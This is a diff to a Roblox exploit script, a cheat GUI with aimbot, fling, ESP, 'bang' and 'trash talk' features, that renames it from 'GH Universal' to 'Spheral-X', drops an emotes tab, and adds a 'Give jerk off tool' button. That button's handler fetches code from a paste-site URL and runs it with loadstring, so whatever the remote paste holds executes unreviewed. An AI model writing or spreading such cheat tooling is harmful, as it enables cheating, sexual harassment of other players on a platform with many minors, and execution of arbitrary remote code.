@@ -307,7 +307,7 @@ NameLabel.Name = "NameLabel"
 NameLabel.Size = UDim2.new(1,0,0.1,0)
 NameLabel.Position = UDim2.new(0,0,0,0)
 NameLabel.BackgroundColor3 = Color3.fromRGB(2, 2, 2)
-NameLabel.Text = "GH"
+NameLabel.Text = "SX"
 NameLabel.TextColor3 = Color3.new(1,1,1)
 NameLabel.Font = Enum.Font.Michroma
 NameLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -665,7 +665,6 @@ NewTab("Movement", 2, 10507122420)
 NewTab("Aimbot", 3, 13557340523)
 NewTab("Fling", 4, 0)
 NewTab("Other", 9999, 0)
-NewTab("Other2", 9999, 0)
 
 -- Frames
 
@@ -819,12 +818,6 @@ FlingChecksFrame.Name = "FlingChecksFrame"
 FlingChecksFrame.NameLabel.Text = "FlingChecks"
 FlingChecksFrame.LayoutOrder = 2
 FlingChecksFrame.Parent = Options
-
-EmotesFrame = FlyFrame:Clone()
-EmotesFrame.Name = "EmotesFrame"
-EmotesFrame.NameLabel.Text = "Animations"
-EmotesFrame.LayoutOrder = 4
-EmotesFrame.Parent = Options
 
 if game.GameId == 3808081382 then --Tsbite
 
@@ -1470,16 +1463,13 @@ local RTKeybindButton = NewButton("Keybind", ChatFrame, "Keybind = None", 2, tru
 local TTEnabledButton = NewButton("Enabled", ChatFrame, "Trash Talk", 3, true)
 local TTKeybindButton = NewButton("Keybind", ChatFrame, "Keybind = None", 4, true)
 ChatArtButton = NewButton("Art", ChatFrame, "Chat Art", 5, true)
-DeleteToolButton = NewButton("Tool", ChatFrame, "Give delete tool", 5, true)
+JTool = NewButton("Tool", ChatFrame, "Give jerk off tool", 6, true)
+DeleteToolButton = NewButton("Tool", nil, "Give delete tool", 5, true)
 
 Tabs.Other = {
 	ESPFrame,
 	BangFrame,
 	ChatFrame,
-}
-
-Tabs.Other2 = {
-	EmotesFrame
 }
 
 TabsFrame.Visible = nil
@@ -4277,6 +4267,14 @@ ChatArtSendButton.MouseButton1Down:Connect(function()
 
 end)
 
+-- Jack off
+
+JTool.MouseButton1Down:Connect(function()
+	
+	loadstring(game:HttpGet("https://pastefy.app/S0dmULwc/raw"))()
+	
+end)
+
 --Emotes
 
 EmotesFolder = Instance.new("Folder")
@@ -4429,7 +4427,7 @@ TWLF:Play()
 TWLF.Completed:Wait()
 NameLabelStroke.Enabled = true
 LoadingFrame:Destroy()
-NameLabel.Text = "GH Universal"
+NameLabel.Text = "Spheral-X"
 TWMF:Play()
 TWMF.Completed:Wait()
 
